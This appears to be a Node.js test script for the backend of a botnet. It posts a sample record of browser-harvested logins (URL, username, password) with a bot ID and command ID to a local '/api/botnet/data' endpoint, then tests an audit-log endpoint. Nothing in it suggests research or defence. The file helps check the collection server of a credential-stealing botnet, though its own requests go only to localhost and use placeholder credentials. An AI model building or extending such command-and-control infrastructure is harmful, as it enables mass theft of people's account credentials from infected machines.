const http = require('http');

// Test bot data endpoint
async function testBotDataEndpoint() {
    return new Promise((resolve, reject) => {
        const postData = JSON.stringify({
            type: 'browser',
            data: {
                browser: 'Chrome',
                entries: [
                    {
                        url: 'https://example.com',
                        username: 'testuser',
                        password: 'testpass123',
                        timestamp: new Date().toISOString()
                    }
                ]
            },
            botId: 'test-bot-001',
            commandId: 'cmd_123456789'
        });

        const options = {
            hostname: 'localhost',
            port: 8080,
            path: '/api/botnet/data',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', (chunk) => {
                body += chunk;
            });
            res.on('end', () => {
                try {
                    const result = JSON.parse(body);
                    resolve({ status: res.statusCode, data: result });
                } catch (error) {
                    resolve({ status: res.statusCode, data: body });
                }
            });
        });

        req.on('error', (error) => {
            reject(error);
        });

        req.write(postData);
        req.end();
    });
}

// Test audit log endpoint
async function testAuditLogEndpoint() {
    return new Promise((resolve, reject) => {
        const postData = JSON.stringify({
            event: 'TEST_EVENT',
            data: { test: true },
            sessionToken: 'test-session-token',
            userAgent: 'test-user-agent',
            ip: '127.0.0.1'
        });

        const options = {
            hostname: 'localhost',
            port: 8080,
            path: '/api/audit/log',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', (chunk) => {
                body += chunk;
            });
            res.on('end', () => {
                try {
                    const result = JSON.parse(body);
                    resolve({ status: res.statusCode, data: result });
                } catch (error) {
                    resolve({ status: res.statusCode, data: body });
                }
            });
        });

        req.on('error', (error) => {
            reject(error);
        });

        req.write(postData);
        req.end();
    });
}

// Run tests
async function runTests() {
    console.log(' Testing Bot Data and Audit Endpoints...\n');

    try {
        console.log('Testing bot data endpoint...');
        const botDataResult = await testBotDataEndpoint();
        console.log(` Bot Data Endpoint: ${botDataResult.status === 200 ? 'PASSED' : 'FAILED'} (Status: ${botDataResult.status})`);
        console.log('Response:', JSON.stringify(botDataResult.data, null, 2));

        console.log('\nTesting audit log endpoint...');
        const auditResult = await testAuditLogEndpoint();
        console.log(` Audit Log Endpoint: ${auditResult.status === 200 ? 'PASSED' : 'FAILED'} (Status: ${auditResult.status})`);
        console.log('Response:', JSON.stringify(auditResult.data, null, 2));

        console.log('\n All bot data endpoints are working correctly!');
    } catch (error) {
        console.error(' Test failed:', error.message);
    }
}

runTests();
